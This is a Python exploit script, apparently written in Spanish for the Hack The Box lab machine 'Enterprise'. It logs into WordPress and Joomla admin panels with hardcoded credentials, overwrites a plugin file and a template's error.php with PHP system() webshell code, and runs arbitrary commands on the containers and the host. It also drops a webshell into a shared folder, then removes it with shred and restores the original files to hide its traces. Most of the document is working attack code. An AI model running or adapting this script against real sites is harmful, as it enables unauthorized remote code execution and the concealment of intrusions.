#!/usr/bin/python3

import argparse
import requests
import re
from urllib3.exceptions import InsecureRequestWarning
from pwn import *

# Quitamos warning al usar SSL inseguro
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

url_wordpress = "http://enterprise.htb"
url_joomla = "http://enterprise.htb:8080"
url_host = "https://enterprise.htb:443"

def def_handler(sig, frame):
    print("\n[!] 3xIt1ngG...\n")
    exit(1)

signal.signal(signal.SIGINT, def_handler)

def arguments():
    parse = argparse.ArgumentParser()
    parse.add_argument(dest='system', type=str, help='Service to do RCE: wordpress, joomla or host')
    parse.add_argument('-c', dest='command', type=str, default='whoami', help='Command to execute, default: whoami')
    return parse.parse_args()

def RCE_docker_wordpress(command):
    session = requests.Session()

    p1 = log.progress("Ejecutando comandos remotamente mediante Wordpress")
    p2 = log.progress("Ingreso al portal como el usuario william.riker")

    headers = {"Cookie" : "wordpress_test_cookie=WP Cookie check"}
    data_post = {
        "log":"william.riker",
        "pwd":"u*Z14ru0p#ttj83zS6",
        "wp-submit":"Log In",
        "redirect_to":"http://enterprise.htb/wp-admin/",
        "testcookie":"1"
    }
    r = session.post(url_wordpress + '/wp-login.php', headers=headers, data=data_post)
    if "Dashboard" not in r.text:
        print("\nCredencialees invalidas o problemas al ingresar.\n")
        p2.failure("✘")
        exit(1)

    p2.success("✓")

    data_get = {
        "file":"lcars/lcars.php",
        "plugin":"lcars/lcars.php"
    }
    r = session.get(url_wordpress + '/wp-admin/plugin-editor.php', params=data_get)

    wpnonce = re.findall(r'name="_wpnonce" value="(.*?)"', r.text)[0]
    content_plugin_wp = '<?php system("%s"); ?>' % (command)

    p3 = log.progress("Modificando plugin lcars para obtener RCE")

    # Modificamos plugin con nuestro payload
    update_plugin_wordpress(session, wpnonce, content_plugin_wp, p3)

    try: 
        r = session.get(url_wordpress + '/wp-content/plugins/lcars/lcars.php', timeout=3)
        print("\n" + r.text)
    except requests.exceptions.Timeout as e:
        pass

    # Dejamos plugin con su contenido original
    content_plugin_wp = "<?php\r\n/*\r\n*     Plugin Name: lcars\r\n*     Plugin URI: enterprise.htb\r\n*     Description: Library Computer Access And Retrieval System\r\n*     Author: Geordi La Forge\r\n*     Version: 0.2\r\n*     Author URI: enterprise.htb\r\n*                             */\r\n\r\n// Need to create the user interface. \r\n\r\n// need to finsih the db interface\r\n\r\n// need to make it secure\r\n\r\n?> \r\n\r\n\r\n\r\n"
    update_plugin_wordpress(session, wpnonce, content_plugin_wp, p3)

    p1.success("✓")
    p3.success("✓")

def update_plugin_wordpress(session, wpnonce, content_plugin_wp, p3):
    data_post = {
        "_wpnonce":wpnonce,
        "_wp_http_referer":"/wp-admin/plugin-editor.php",
        "newcontent":content_plugin_wp,
        "action":"update",
        "file":"lcars/lcars.php",
        "plugin":"lcars/lcars.php", 
        "scrollto":"0",
        "submit":"Update File"
    }

    r = session.post(url_wordpress + '/wp-admin/plugin-editor.php', data=data_post)
    if "File edited successfully" not in r.text:
        p3.failure("✘")
        print("\nProblemas editando el archivo.\n")
        exit(1)

def RCE_docker_joomla_host(system_RCE, command):
    session = requests.Session()

    p1 = log.progress("Ejecutando comandos remotamente hacia %s" % (system_RCE.capitalize()))
    p2 = log.progress("Logeandonos con el usuario geordi.la.forge en joomla")

    # Login
    r = session.get(url_joomla + '/administrator/index.php')
    ret_val = re.findall(r'name="return" value="(.*?)"', r.text)[0]
    token_val = re.findall(r'name="(.*?)" value="1"', r.text)[0]
    data_post = {
        "username":"geordi.la.forge",
        "passwd":"ZD3YxfnSjezg67JZ",
        "option":"com_login",
        "task":"login",
        "return":ret_val,
        token_val:"1"
    }

    r = session.post(url_joomla + '/administrator/index.php', data=data_post)
    if "An error has occurred" not in r.text:
        p2.failure("✘")
        print("\nValida las credenciales. Problemas en el login.\n")
        exit(1)

    p2.success("✓")

    # Token archivo
    data_get = {
        "option":"com_templates",
        "view":"template",
        "id":"503",
        "file":"L2Vycm9yLnBocA=="
    }
    r = session.get(url_joomla + '/administrator/index.php', params=data_get)
    token_val = re.findall(r'name="(.*?)" value="1"', r.text)[0]

    if system_RCE.lower() == "host":
        p3 = log.progress("Creando archivo en la carpeta compartida")

        # Modificamos plugin con nuestro contenido
        content_create_file = "echo '<?php system(\\\"%s\\\"); ?>' > /var/www/html/files/lcarz.php" % (command)
        content_plugin_jo = '<?php system("%s"); ?>' % (content_create_file)
        update_plugin_joomla(session, token_val, content_plugin_jo)

        # Creamos el archivo lcarz.php
        r = session.get(url_joomla + '/templates/beez3/error.php')

        try:
            # Validamos archivo carpeta compartida - RCE
            r = session.get(url_host + '/files/lcarz.php', verify=False, timeout=3)
            p3.success("✓")
            print("\n" + r.text)
        except requests.exceptions.Timeout as e:
            p3.success("✓")
            
        # Borramos archivo de la carpeta compartida
        content_plugin_jo = '<?php system("shred -zun 11 /var/www/html/files/lcarz.php"); ?>'
        update_plugin_joomla(session, token_val, content_plugin_jo)
        # Hacemos la peticion para que ejecute el archivo, osea ejecute el borrado
        r = session.get(url_joomla + '/templates/beez3/error.php')

    elif system_RCE.lower() == "joomla":
        # Modificamos plugin con nuestro contenido
        content_plugin_jo = '<?php system("%s"); ?>' % (command)
        update_plugin_joomla(session, token_val, content_plugin_jo)

        try:
            r = session.get(url_joomla + '/templates/beez3/error.php', timeout=3)
            print("\n" + r.text)
        except requests.exceptions.Timeout as e:
            pass

    # Modificamos el contenido del plugin con php "normal"
    content_plugin_jo = '<?php\n\necho "This page is for errors.";\necho "Contact us to more information.";\n\n?>',
    update_plugin_joomla(session, token_val, content_plugin_jo)

    p1.success("✓")

def update_plugin_joomla(session, token_val, content_plugin_jo):
    data_get = {
        "option":"com_templates",
        "view":"template",
        "id":"503",
        "file":"L2Vycm9yLnBocA"
    }

    data_post = {
        "jform[source]":content_plugin_jo,
        "task":"template.apply",
        token_val:"1",
        "jform[extension_id]":"503",
        "jform[filename]":"/error.php"
    }

    r = session.post(url_joomla + '/administrator/index.php', params=data_get, data=data_post)
    if "File saved." not in r.text:
        print("\nError modificando plugin joomla\n")
        exit(1)

# Inicio del programa
if __name__ == '__main__':
    args = arguments()
    if args.system == "wordpress":
        RCE_docker_wordpress(args.command)
    elif args.system == "joomla":
        RCE_docker_joomla_host(args.system, args.command)
    elif args.system == "host":
        RCE_docker_joomla_host(args.system, args.command)
    else:
        print("\nDebes indicar contra que sistema quieres ejecutar los comandos:")
        print("\n.py <system> (wordpress - joomla - host)\n")
        exit(1)

    print("[+] A s3gUir R0mp13nd0!!\n")
